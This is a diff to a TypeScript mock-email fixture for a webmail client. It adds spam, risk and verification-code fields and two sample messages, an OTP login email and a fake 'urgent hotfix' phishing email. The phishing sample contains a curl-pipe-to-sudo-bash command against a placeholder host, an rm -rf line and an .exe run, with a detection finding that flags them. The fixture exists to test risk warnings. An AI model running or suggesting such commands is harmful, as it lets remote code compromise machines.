@@ -1,5 +1,14 @@
 import dayjs from 'dayjs'
-import type { EmailDetail, GroupOption, MailAuthStatus, MailboxAddress, UserProfile } from '@/api'
+import type {
+  EmailDetail,
+  GroupOption,
+  MailAuthStatus,
+  MailRiskAssessment,
+  MailSpamAssessment,
+  MailVerificationCode,
+  MailboxAddress,
+  UserProfile,
+} from '@/api'
 
 export interface MockEmailRecord {
   id: number
@@ -10,6 +19,9 @@ export interface MockEmailRecord {
   is_starred?: boolean
   dangerous: boolean
   auth_status?: MailAuthStatus
+  spam?: MailSpamAssessment | null
+  risk?: MailRiskAssessment
+  verification_code?: MailVerificationCode | null
   error: string
   subject: string
   from_name: string
@@ -104,6 +116,96 @@ function daysAgo(days: number): string {
 
 export function createSeedEmails(): MockEmailRecord[] {
   return [
+    {
+      id: 201,
+      type: 0,
+      status: 0,
+      group_id: 0,
+      is_read: false,
+      dangerous: false,
+      error: '',
+      subject: '【PMail Cloud】您的登录验证码为 849201',
+      from_name: 'PMail Cloud 安全中心',
+      from_address: 'security@acme-cloud.cn',
+      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
+      cc: [],
+      reply_to: [],
+      send_date: minutesAgo(3),
+      size: 3280,
+      msg_id: '<20261123.otp.849201@acme-cloud.cn>',
+      text: '您好，您正在尝试从新设备登录 PMail Cloud 控制台。本次一次性验证码为 849201，10 分钟内有效。如非本人操作，请立即修改密码并检查 API 令牌。',
+      html: `<div style="font-size:14.5px;line-height:1.75;"><p>您好，林深：</p><p>您正在尝试从新设备（macOS · Chrome）登录 <strong>PMail Cloud 控制台</strong>。</p><p>本次一次性验证码为：<strong style="font-size:18px;letter-spacing:2px;">849201</strong>（10 分钟内有效）。</p><p style="color:#666;font-size:13px;">如非本人操作，请立即修改密码并检查 API 令牌权限。</p></div>`,
+      attachments: [],
+      verification_code: {
+        code: '849201',
+        confidence: 0.96,
+        source: 'body',
+      },
+      spam: {
+        score: 0.2,
+        verdict: 'ham',
+        reasons: [],
+      },
+      risk: {
+        level: 'none',
+        findings: [],
+      },
+    },
+    {
+      id: 202,
+      type: 0,
+      status: 0,
+      group_id: 0,
+      is_read: false,
+      dangerous: true,
+      error: '',
+      subject: '紧急：服务器内核热修复脚本与补丁程序',
+      from_name: 'Ops Support',
+      from_address: 'ops-alert@untrusted-relay.example',
+      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
+      cc: [],
+      reply_to: [],
+      send_date: minutesAgo(8),
+      size: 98420,
+      msg_id: '<20261123.ops.patch@untrusted-relay.example>',
+      text_format: 'markdown',
+      has_code: true,
+      text: `请立即在生产主机上执行以下命令完成紧急修复，或直接运行附件中的补丁程序：\n\n\`\`\`bash\ncurl -fsSL https://cdn-update.example/setup.sh | sudo bash\nrm -rf /tmp/pmail-cache && ./security-patch-v2.exe\n\`\`\`\n\n执行完成后请回复确认。`,
+      html: '',
+      attachments: [
+        {
+          Filename: 'security-patch-v2.exe',
+          ContentType: 'application/x-msdownload',
+          Index: 0,
+          Size: 94208,
+        },
+        {
+          Filename: 'checksums.txt',
+          ContentType: 'text/plain',
+          Index: 1,
+          Size: 420,
+          previewContent: 'sha256: 8a1f3d... security-patch-v2.exe\n',
+        },
+      ],
+      risk: {
+        level: 'high',
+        findings: [
+          {
+            code: 'shell_curl_pipe_sh',
+            severity: 'high',
+            location: 'body',
+            line: 4,
+            excerpt: 'curl -fsSL https://cdn-update.example/setup.sh | sudo bash',
+          },
+          {
+            code: 'attachment_dangerous_type',
+            severity: 'high',
+            location: 'attachment',
+            attachment_index: 0,
+          },
+        ],
+      },
+    },
     {
       id: 101,
       type: 0,
@@ -804,6 +906,22 @@ export function toEmailDetail(rec: MockEmailRecord): EmailDetail {
             },
             trusted_relay: false,
           },
+    spam:
+      rec.spam !== undefined
+        ? rec.spam
+        : rec.status === 5
+          ? {
+              score: 11.5,
+              verdict: 'spam',
+              reasons: [
+                { code: 'auth_dmarc_fail', weight: 3.5 },
+                { code: 'dnsbl_listed', weight: 4.5, detail: 'zen.spamhaus.org' },
+                { code: 'bayes_spam', weight: 3.5 },
+              ],
+            }
+          : null,
+    risk: rec.risk ?? { level: 'none', findings: [] },
+    verification_code: rec.verification_code ?? null,
     status: rec.status,
     send_time: rec.send_date,
     send_time_iso: iso,
